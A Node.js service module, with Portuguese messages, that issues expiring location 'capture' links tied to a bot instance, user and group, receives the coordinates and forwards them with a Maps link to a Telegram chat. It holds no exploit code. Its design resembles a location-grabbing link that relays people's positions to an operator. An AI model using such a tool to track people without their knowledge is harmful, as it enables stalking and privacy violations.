const crypto = require('crypto');
const axios = require('axios');
const logger = require('../../services/loggerService');

const DEFAULT_REQUEST_TTL_MS = 10 * 60 * 1000;
const requests = new Map();

const getConfig = () => ({
    publicBaseUrl: String(process.env.LOCATION_CAPTURE_BASE_URL || process.env.CONTROL_API_URL || '').trim(),
    registrationKey: String(process.env.CONTROL_REGISTRATION_KEY || '').trim(),
    telegramBotToken: String(process.env.TELEGRAM_BOT_TOKEN || '').trim(),
    telegramChatId: String(process.env.TELEGRAM_CHAT_ID || '').trim(),
    requestTtlMs: Number(process.env.LOCATION_REQUEST_TTL_MS || DEFAULT_REQUEST_TTL_MS)
});

const pruneExpired = () => {
    const ttlMs = getConfig().requestTtlMs;
    const now = Date.now();

    for (const [requestId, payload] of requests.entries()) {
        if (now - payload.createdAtMs > ttlMs) {
            requests.delete(requestId);
        }
    }
};

const requireRegistrationKey = (providedKey) => {
    const expectedKey = getConfig().registrationKey;

    if (!expectedKey || String(providedKey || '').trim() !== expectedKey) {
        const error = new Error('Registration key invalida');
        error.statusCode = 401;
        throw error;
    }
};

const createLocationRequest = (body = {}) => {
    pruneExpired();

    const instanceId = String(body.instanceId || '').trim();
    const userId = String(body.userId || '').trim();
    const groupId = String(body.groupId || '').trim();

    if (!instanceId || !userId) {
        const error = new Error('Dados incompletos para criar solicitacao de localizacao');
        error.statusCode = 400;
        throw error;
    }

    const requestId = crypto.randomUUID();
    const createdAt = new Date().toISOString();

    requests.set(requestId, {
        requestId,
        instanceId,
        userId,
        groupId,
        createdAt,
        createdAtMs: Date.now()
    });

    const publicBaseUrl = getConfig().publicBaseUrl.replace(/\/+$/, '');

    if (!publicBaseUrl) {
        const error = new Error('LOCATION_CAPTURE_BASE_URL ou CONTROL_API_URL precisa estar configurado');
        error.statusCode = 500;
        throw error;
    }

    const captureUrl = `${publicBaseUrl}/location/capture/${requestId}`;

    logger.info(`Solicitacao de localizacao criada. requestId=${requestId} | instanceId=${instanceId} | userId=${userId}.`);

    return {
        requestId,
        captureUrl,
        expiresInMs: getConfig().requestTtlMs,
        createdAt
    };
};

const getLocationRequest = (requestId) => {
    pruneExpired();
    return requests.get(String(requestId || '').trim()) || null;
};

const consumeLocationRequest = (requestId) => {
    const request = getLocationRequest(requestId);

    if (!request) {
        const error = new Error('Solicitacao de localizacao invalida ou expirada');
        error.statusCode = 404;
        throw error;
    }

    requests.delete(request.requestId);
    return request;
};

const sendToTelegram = async ({ latitude, longitude, mapsUrl, request }) => {
    const config = getConfig();

    if (!config.telegramBotToken || !config.telegramChatId) {
        logger.warn('Localizacao recebida sem envio para Telegram: TELEGRAM_BOT_TOKEN/TELEGRAM_CHAT_ID ausentes.');
        return { sent: false, reason: 'telegram_nao_configurado' };
    }

    const message = [
        'Nova localizacao capturada',
        `Instancia: ${request.instanceId}`,
        `Usuario: ${request.userId}`,
        `Grupo: ${request.groupId || 'direto'}`,
        `Latitude: ${latitude}`,
        `Longitude: ${longitude}`,
        `Maps: ${mapsUrl}`
    ].join('\n');

    await axios.post(`https://api.telegram.org/bot${config.telegramBotToken}/sendMessage`, {
        chat_id: config.telegramChatId,
        text: message
    }, {
        timeout: 5000
    });

    logger.info(`Localizacao enviada ao Telegram. requestId=${request.requestId}.`);
    return { sent: true, reason: '' };
};

const registerLocation = async (body = {}) => {
    const requestId = String(body.requestId || '').trim();
    const latitude = Number(body.latitude);
    const longitude = Number(body.longitude);

    if (!requestId || Number.isNaN(latitude) || Number.isNaN(longitude)) {
        const error = new Error('Payload de localizacao invalido');
        error.statusCode = 400;
        throw error;
    }

    const request = consumeLocationRequest(requestId);
    const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;

    logger.info(`Localizacao recebida. requestId=${request.requestId} | instanceId=${request.instanceId}.`);

    const telegram = await sendToTelegram({ latitude, longitude, mapsUrl, request });

    return {
        ok: true,
        requestId,
        instanceId: request.instanceId,
        userId: request.userId,
        groupId: request.groupId,
        latitude,
        longitude,
        mapsUrl,
        telegram
    };
};

module.exports = {
    createLocationRequest,
    getConfig,
    getLocationRequest,
    registerLocation,
    requireRegistrationKey
};
